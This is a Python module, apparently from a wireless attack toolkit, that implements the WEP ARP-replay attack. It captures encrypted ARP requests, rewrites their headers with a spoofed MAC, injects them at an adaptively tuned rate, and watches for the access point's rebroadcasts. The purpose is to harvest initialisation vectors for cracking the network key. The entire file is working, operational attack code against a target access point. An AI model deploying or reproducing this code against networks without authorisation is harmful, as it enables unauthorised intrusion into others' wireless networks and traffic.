"""WEP ARP replay (`aireplay-ng -3`): the IV workhorse.

Re-injects a captured WEP-encrypted ARP request on a loop. The AP can't tell
it's a replay (WEP has no replay protection: that absence is *why* this
works), so it decrypts and rebroadcasts each one under a FRESH IV. Every
rebroadcast is a new unique IV for the cracker. This is the only attack in
the suite that actually generates IVs; fake-auth gates it and (later)
frag/chopchop only manufacture an ARP to feed it.

Only ToDS (client→AP) ARPs are usable seeds. The collector enforces that.

Candidate handling (deliberately PATIENT): the AP's rebroadcast of a good ARP
can arrive a beat after a single short burst, so judging a candidate on one
cycle falsely condemns replayable seeds. Instead each candidate gets a multi-
second trial; only a sustained absence of echoes blacklists it. "Replayable"
means the AP echoed OUR frame back: we match its rebroadcast on FromDS +
broadcast DA + SA==our MAC, the same correlation frag/chopchop use, NOT that
the global IV count happened to rise (another client's traffic must never be
mistaken for a working replay). Once the AP echoes one, we lock on and keep
replaying it. If a locked winner stalls (likely we got de-associated) we ask
fake-auth to re-auth and keep the same seed rather than discarding it.

Rate control (climb-with-peak-memory, validated in scripts/wep/wep_lab.py across
SPOOFABLE / FIXED_MAC / NONE cards): each 2-second window (> the AP's ~1-2s
relay lag) blasts ``_target`` injects at the card's full speed, then sleeps the
remainder so the rebroadcasts have RX airtime. After each window it climbs
``_target`` while the AP's echo rate rises, remembers the best (echo, target),
and settles back to it once higher stops helping (re-probing occasionally). A
card below the AP's relay ceiling climbs to all-gas; a fast one settles at the
knee. The control signal is the AP-echo rate (``_rx_cb``), not the raw IV count.
"""

from __future__ import annotations

import asyncio
import logging
import os
import time
from dataclasses import dataclass, field
from typing import Awaitable, Callable, List, Optional

from wifit3.models import AccessPoint
from wifit3.dot11 import str_to_mac
from wifit3.campaigns import treelog

logger = logging.getLogger(__name__)

_BROADCAST = b"\xff" * 6


async def _always_associated() -> bool:
    return True


@dataclass
class ArpReplayStats:
    injected: int = 0
    cycles: int = 0
    last_gain: int = 0           # unique IVs gained in the last burst cycle
    effective_pps: float = 0.0   # injected / full cycle (incl. RX window)
    raw_pps: float = 0.0         # injected / burst-only (the hardware cap tell)
    burst_size: int = 0          # current adaptive burst size
    candidates_tried: int = 0
    candidates_failed: int = 0
    has_winner: bool = False
    started_at: float = field(default_factory=time.time)


class WepArpReplay:
    """ARP-replay loop: patient candidate testing + a climb-with-peak-memory inject-rate controller."""

    # Climb-with-peak-memory rate controller (see scripts/wep/wep_lab.py --strategy adaptive). Window is
    # 2s (> the AP's ~1-2s relay lag) so a window's echoes are not smeared across separate bursts.
    _WINDOW_S = 2.0
    _CTRL_START = 100.0         # kickstart injects per window
    _CTRL_GROW = 1.25           # multiplicative climb step
    _CTRL_ECHO_EWMA = 0.5       # smoothing on the per-window echo rate the controller acts on
    _CTRL_REPROBE_WINDOWS = 8   # windows to hold at the peak before re-probing the ceiling
    _CTRL_MIN_TARGET = 20.0     # never drop the target below this (keep probing)
    _TRIAL_WINDOW = 4.0     # Time to keep testing one candidate before judging it (seconds).
    _MIN_TRIAL_GAIN = 1     # Echoes needed to call a candidate replayable.
    _STALL_REAUTH_AFTER = 2.0
    _STALL_DEMOTE_AFTER = 6.0
    _FAILED_RETRY_COOLDOWN = 20.0

    def __init__(
        self,
        iface,
        target: AccessPoint,
        collector,
        source_mac: Optional[bytes] = None,
        ensure_associated: Optional[Callable[[], Awaitable[bool]]] = None,
        request_reauth: Optional[Callable[[], None]] = None,
        log_callback: Optional[Callable[[str], None]] = None,
    ):
        self.iface = iface
        self.target = target
        self.bssid = target.bssid
        self.bssid_bytes = str_to_mac(target.bssid)
        self.source_mac = source_mac or (bytes([0x02]) + os.urandom(5))
        self.collector = collector
        self._ensure_associated = ensure_associated or _always_associated
        self._request_reauth = request_reauth or (lambda: None)
        self._log = log_callback or (lambda _m: None)

        self.stats = ArpReplayStats()
        self.state = "idle"   # idle|waiting-auth|waiting-arp|testing|replaying|paused

        self._active = False
        self._paused = False
        self._task: Optional[asyncio.Task] = None

        # Climb-with-peak-memory controller state (injects per window). _reset_rate_search seeds it.
        self._target = self._CTRL_START
        self._best_echo = 0.0
        self._best_target = self._CTRL_START
        self._echo_ewma = -1.0                # smoothed per-window echo rate the controller acts on
        self._last_echo_rate = 0.0            # this window's raw echo rate
        self._ctrl_misses = 0                 # consecutive no-improvement windows while climbing
        self._ctrl_climbing = True
        self._ctrl_since_probe = 0

        self._echoes = 0  # AP-echo correlation (the control + verdict signal)

        # Candidate under test/replay + its trial accounting.
        self._current: Optional[bytes] = None
        self._winner: Optional[bytes] = None
        self._trial_gain = 0
        self._trial_started = 0.0
        self._stall_started = 0.0
        self._reauth_requested = False
        self._failed: set[bytes] = set()
        self._failed_at = 0.0

        self._last_state = ""

    # ---- Lifecycle ----------------------------------------------------------

    def start(self) -> None:
        if self._active:
            return
        self._active = True
        self.stats = ArpReplayStats()
        # Fresh P&O search each session.
        self._reset_rate_search()
        self._echoes = 0
        # Watch for the AP echoing our replays back: the "replayable" signal.
        self.iface.register_rx_callback(self._rx_cb)
        self._task = asyncio.create_task(self._replay_loop())
        logger.info("[WEP-ARP] Replay started on %s", self.bssid)

    def stop(self) -> ArpReplayStats:
        if not self._active:
            return self.stats
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        if self._task:
            self._task.cancel()
            self._task = None
        self.state = "idle"
        logger.info(
            "[WEP-ARP] Replay stopped: %d injected, %d unique IVs.",
            self.stats.injected, self.collector.unique_count(self.bssid),
        )
        return self.stats

    def pause(self) -> None:
        """Halt TX without tearing down, for the frag/chopchop sub-modes that
        need exclusive use of the radio."""
        self._paused = True

    def resume(self) -> None:
        self._paused = False

    @property
    def is_active(self) -> bool:
        return self._active

    @property
    def target_pps(self) -> float:
        """The controller's chosen injection rate, packets/second (target injects / window)."""
        return self._target / self._WINDOW_S if self._WINDOW_S > 0 else self._target

    # ---- Candidate selection ------------------------------------------------

    def _next_candidate(self, candidates: List[bytes]) -> Optional[bytes]:
        """First not-blacklisted candidate (winner handling is in the loop)."""
        if self._failed and (time.time() - self._failed_at) > self._FAILED_RETRY_COOLDOWN:
            self._failed.clear()
        for cand in candidates:
            if cand not in self._failed:
                return cand
        return None

    def _begin_trial(self, cand: bytes) -> None:
        self._current = cand
        self._trial_gain = 0
        self._trial_started = time.time()
        self._stall_started = 0.0
        self._reauth_requested = False
        if cand is not self._winner:
            self.stats.candidates_tried += 1
        self._log(
            f"[bold green]ARP Replay:[/bold green] Testing candidate packet "
            f"({len(cand)} B)…"
        )

    # ---- Replay loop --------------------------------------------------------

    async def _replay_loop(self) -> None:
        try:
            while self._active:
                if self._paused:
                    self._set_state("paused")
                    await asyncio.sleep(0.2)
                    continue

                # Find an ARP to replay FIRST.
                if self._winner is not None:
                    self._current = self._winner
                else:
                    candidates = self.collector.arp_candidates(self.bssid)
                    cand = self._next_candidate(candidates)
                    if cand is None:
                        self._set_state("waiting-arp")
                        await asyncio.sleep(0.3)
                        continue
                    if self._current is not cand:
                        self._begin_trial(cand)

                # We have something to send, now (lazily) associate.
                if not await self._ensure_associated():
                    self._set_state("waiting-auth")
                    await asyncio.sleep(0.3)
                    continue

                gain = await self._burst_window(self._current)
                self._trial_gain += gain
                self._judge(gain)
                self._maybe_adjust_rate()
        except asyncio.CancelledError:
            pass

    def _build_replay_frame(self, captured: bytes) -> Optional[bytes]:
        """Re-address a captured WEP ARP into a ToDS frame sourced from our
        associated MAC, reusing its (cleartext-headed) encrypted body verbatim."""
        if len(captured) < 28:
            return None
        fc0, fc1 = captured[0], captured[1]
        hdr = 24
        if (fc1 & 0x01) and (fc1 & 0x02):    # ToDS+FromDS → 4-addr (WDS)
            hdr += 6
        if ((fc0 & 0xF0) >> 4) & 0x08:       # QoS data subtype
            hdr += 2
        if fc1 & 0x80:                       # HT Control (Order bit)
            hdr += 4
        body = captured[hdr:]                # IV(3)+KeyID(1)+ciphertext+ICV
        if len(body) < 8:
            return None
        new_hdr = (
            b"\x08\x41"                       # Data, ToDS=1, Protected=1
            + b"\x00\x00"                     # Duration
            + self.bssid_bytes                # Addr1 = BSSID (RA)
            + self.source_mac                 # Addr2 = us (associated TA/SA)
            + b"\xff\xff\xff\xff\xff\xff"     # Addr3 = broadcast (DA)
            + b"\x00\x00"                     # Seq (hardware fills)
        )
        return new_hdr + body

    # ---- Echo watch (RX callback) -------------------------------------------

    def _rx_cb(self, pkt) -> None:
        """Count the AP echoing one of OUR replays: the "replayable" signal."""
        frame = pkt.raw
        if not self._active or self._paused or len(frame) < 22:
            return
        fc0, fc1 = frame[0], frame[1]
        if ((fc0 >> 2) & 0x03) != 2:            # not data
            return
        if not (fc1 & 0x40):                    # not Protected (WEP)
            return
        if not (fc1 & 0x02) or (fc1 & 0x01):    # need FromDS, not ToDS
            return
        if frame[4:10] != _BROADCAST:           # Addr1 (DA) not broadcast
            return
        if frame[16:22] != self.source_mac:     # Addr3 (SA) not us
            return
        self._echoes += 1

    async def _burst_window(self, cand: bytes) -> int:
        """One ``_WINDOW_S`` window: blast ``_target`` injects at the card's full speed, then sleep
        the remainder so the AP's rebroadcasts (our IVs) have RX airtime. Returns the AP-echo gain
        (the verdict + control signal). No fixed duty cap: the controller keeps ``_target`` bounded,
        and a card that cannot inject ``_target`` within the window simply runs all-gas."""
        frame = self._build_replay_frame(cand)
        if frame is None:
            # Malformed capture: blacklist and move on.
            self._failed.add(cand)
            self._current = None
            return 0
        ivs_before = self.collector.unique_count(self.bssid)
        echoes_before = self._echoes
        t0 = time.time()
        sent = 0
        for _ in range(int(round(self._target))):
            # Stop if torn down, or (safety) if the burst has run 2x the window. A slow card at a
            # high target just runs all-gas; the guard only bounds a pathological overrun.
            if not self._active or (self._WINDOW_S > 0 and (time.time() - t0) >= 2 * self._WINDOW_S):
                break
            try:
                await self.iface.send_no_wait(frame)
                self.stats.injected += 1
                sent += 1
            except Exception:
                logger.exception(f"[WEP-ARP] failed to send frame during burst (sent={sent})")
                break
        send_dt = max(1e-3, time.time() - t0)                    # burst only: the hardware cap
        await asyncio.sleep(max(0.0, self._WINDOW_S - send_dt))  # listen: RX airtime for the echoes
        window_dt = max(1e-3, time.time() - t0)
        self.stats.cycles += 1
        self.stats.raw_pps = sent / send_dt           # card's burst speed
        self.stats.effective_pps = sent / window_dt   # over the full window
        self.stats.burst_size = sent
        gain = self.collector.unique_count(self.bssid) - ivs_before
        self.stats.last_gain = gain
        echo_gain = self._echoes - echoes_before
        self._last_echo_rate = echo_gain / window_dt  # the controller's objective
        return echo_gain

    def _judge(self, gain: int) -> None:
        """Decide what to do with the current candidate based on its trial."""
        is_winner = self._current is self._winner

        if is_winner:
            self._set_state("replaying")
            if gain > 0:
                self._stall_started = 0.0
                self._reauth_requested = False
                return
            # Winner went quiet, likely we got de-associated. Give grace period
            now = time.time()
            if self._stall_started == 0.0:
                self._stall_started = now
            stalled = now - self._stall_started
            if stalled > self._STALL_REAUTH_AFTER and not self._reauth_requested:
                self._reauth_requested = True
                self._request_reauth()
                self._log("[yellow]ARP replay stalled: re-authenticating[/yellow]")
            if stalled > self._STALL_DEMOTE_AFTER:
                self._winner = None
                self._current = None
                self.stats.has_winner = False
                self._reset_rate_search()   # don't leave the next search pinned at a high rate
            return

        # Testing a candidate: it's replayable once the AP has echoed it _MIN_TRIAL_GAIN.
        self._set_state("testing")
        if self._trial_gain >= self._MIN_TRIAL_GAIN:
            self._winner = self._current
            self.stats.has_winner = True
            self._failed.discard(self._current)
            self._log(treelog.branch_ok(
                f"Candidate packet ({len(self._current)} B) is "
                "[bold green]replayable[/bold green]"
            ))
            self._log(treelog.leaf_ok(
                "[bold green]ARP Replaying now[/bold green] [dim]for IVs[/dim]"
            ))
        elif (time.time() - self._trial_started) >= self._TRIAL_WINDOW:
            failed_len = len(self._current)
            self._failed.add(self._current)
            self._failed_at = time.time()
            self.stats.candidates_failed = len(self._failed)
            self._current = None
            self._log(treelog.leaf_fail(
                f"[yellow]failed to replay ({failed_len} B)[/yellow] "
                "[dim](AP never echoed it)[/dim]"
            ))

    def _reset_rate_search(self) -> None:
        """Reset the rate controller to its start state. Used by start() and on winner-demote so a
        stalled session re-climbs from the low kickstart instead of staying pinned high."""
        self._target = self._CTRL_START
        self._best_echo = 0.0
        self._best_target = self._CTRL_START
        self._echo_ewma = -1.0
        self._ctrl_misses = 0
        self._ctrl_climbing = True
        self._ctrl_since_probe = 0

    def _maybe_adjust_rate(self) -> None:
        """Climb-with-peak-memory, once per window while replaying. Push ``_target`` up while the
        (smoothed) AP-echo rate rises; remember the best (echo, target); when higher stops helping,
        settle back to the best and hold, re-probing every ``_CTRL_REPROBE_WINDOWS``. echoes -> 0
        drives ``_target`` toward the floor, never toward max (so a dead AP can't cause a runaway)."""
        if self.state != "replaying":
            return
        er = self._last_echo_rate
        self._echo_ewma = er if self._echo_ewma < 0 else (
            self._CTRL_ECHO_EWMA * er + (1.0 - self._CTRL_ECHO_EWMA) * self._echo_ewma)
        self._ctrl_since_probe += 1
        if self._ctrl_climbing:
            if self._echo_ewma > self._best_echo * 1.03:    # higher helped: remember + keep climbing
                self._best_echo = self._echo_ewma
                self._best_target = self._target
                self._ctrl_misses = 0
                self._target *= self._CTRL_GROW
            else:
                self._ctrl_misses += 1                      # no gain; tolerate one lagged window
                if self._ctrl_misses >= 2:
                    self._target = self._best_target        # settle back at the peak
                    self._ctrl_climbing = False
                    self._ctrl_misses = 0
                    self._ctrl_since_probe = 0
                else:
                    self._target *= self._CTRL_GROW
        else:
            self._target = self._best_target                # hold at the peak
            if self._ctrl_since_probe >= self._CTRL_REPROBE_WINDOWS:
                self._ctrl_climbing = True                  # re-probe the ceiling
                self._ctrl_since_probe = 0
        self._target = max(self._CTRL_MIN_TARGET, min(self._target, self._best_target * 4 + 200))

    # ---- Logging ------------------------------------------------------------

    def _set_state(self, state: str) -> None:
        """Set the current state; log only on a real transition (no spam)."""
        self.state = state
        if state == self._last_state:
            return
        self._last_state = state
        if state == "waiting-arp":
            self._log("[bold green]ARP Replay:[/bold green] waiting for ARP")

